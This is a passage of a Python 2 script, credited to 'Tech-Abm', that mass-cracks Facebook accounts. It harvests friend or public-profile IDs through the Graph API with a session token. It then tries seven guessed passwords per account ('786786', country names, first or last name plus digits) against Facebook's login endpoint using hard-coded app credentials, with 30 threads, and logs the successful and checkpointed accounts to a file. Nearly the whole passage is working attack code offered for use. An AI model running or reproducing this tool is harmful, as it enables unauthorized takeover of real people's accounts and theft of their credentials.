		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading process........ "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  «-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m «--------------------------------------------»"
	jalan('   \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;91m            Create By : Tech-Abm')
	print "\033[1;97m «--------------------------------------------»"

	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Tech-abm
		try:													
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = ('America123') 
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = y['first_name'] + '786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\x1b[1;97m' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = y['last_name'] + '786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																												   	
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m «--------------------------------------------»"
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
def haterx():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;96m «--------------------------------------------»" 
        print( "\x1b[1;32;92m[1] \033[1;33;95m>> Crack From Friendlist \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;92m[2] \033[1;33;95m>> Crack From Public ID \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
	print "\033[1;96m «--------------------------------------------»" 
	pilih_haterx()

def pilih_haterx():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_haterx()
        elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		jalan('\033[1;96m[⊱⋕⊰] \033[1;92mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading process........ "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  «-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m «--------------------------------------------»"
	jalan('   \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;91m            Create By : Tech-Abm')
	print "\033[1;97m «--------------------------------------------»"

	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Tech-abm
		try:													
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = ('Denmark') 
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = y['first_name'] + '786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\x1b[1;97m' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = y['last_name'] + '786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																												   	
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m «--------------------------------------------»"
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
def japanx():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m «--------------------------------------------»"
        print( "\x1b[1;32;92m[1] \033[1;33;93m>> Crack From Friendlist \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;92m[2] \033[1;33;98m>> Crack From Public ID \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
	print "\033[1;97m «--------------------------------------------»"
	pilih_japanx()

def pilih_japanx():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_japanx()
        elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		jalan('\033[1;96m[⊱⋕⊰] \033[1;92mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading process........ "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  «-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m «--------------------------------------------»"
	jalan('   \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;91m            Create By : Tech-Abm')
	print "\033[1;97m «--------------------------------------------»"

	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Tech-abm
		try:													
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = ('Japan123') 
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = y['first_name'] + '786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\x1b[1;97m' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = y['last_name'] + '786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
